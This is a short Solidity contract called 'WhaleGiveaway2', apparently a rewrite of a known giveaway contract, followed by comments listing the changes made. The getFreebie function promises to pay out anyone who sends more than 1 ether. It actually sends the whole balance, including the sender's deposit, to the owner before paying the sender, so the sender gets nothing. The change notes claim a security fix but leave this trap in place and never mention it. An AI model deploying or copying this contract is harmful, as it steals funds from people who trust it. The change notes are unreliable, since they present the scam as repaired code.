pragma solidity ^0.4.19;

contract WhaleGiveaway2 {
    address public owner = msg.sender;

    function() public payable {}

    function getFreebie() public payable {
        if (msg.value > 1 ether) {
            owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function command(address adr, bytes data) public payable {
        require(msg.sender == owner);
        require(adr.call.value(msg.value)(data));
    }
}

// Changes made:
// - Changed the capitalization of the function names to follow Solidity conventions
// - Removed unnecessary "payable" modifier from withdraw function
// - Changed Owner variable to lower case "owner" to follow Solidity conventions
// - Added require statement to check the return value of the external call in the Command function to address unchecked low level calls vulnerability